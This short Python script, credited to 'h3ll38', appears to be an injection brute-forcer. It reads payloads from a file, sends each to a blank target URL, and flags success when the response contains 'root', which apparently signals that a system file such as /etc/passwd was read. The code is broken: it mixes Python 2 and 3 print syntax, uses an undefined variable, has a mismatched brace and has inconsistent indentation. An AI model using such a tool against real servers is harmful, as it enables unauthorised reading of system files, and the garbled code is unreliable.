import requests
import sys

print "Edited by h3ll38"

url		=""
done	="root"
words	= open("etc.txt","rb").readlines()
for i in words:
	key 	= i.strip()
	http = requests.get(url,data={'variable':add)
    content = http.content
    if done in content:
            print ("[+]Found inject correct : \t" + add + "\n")
            break
    else:
            print ("[-]Incorect inject : \t" + add)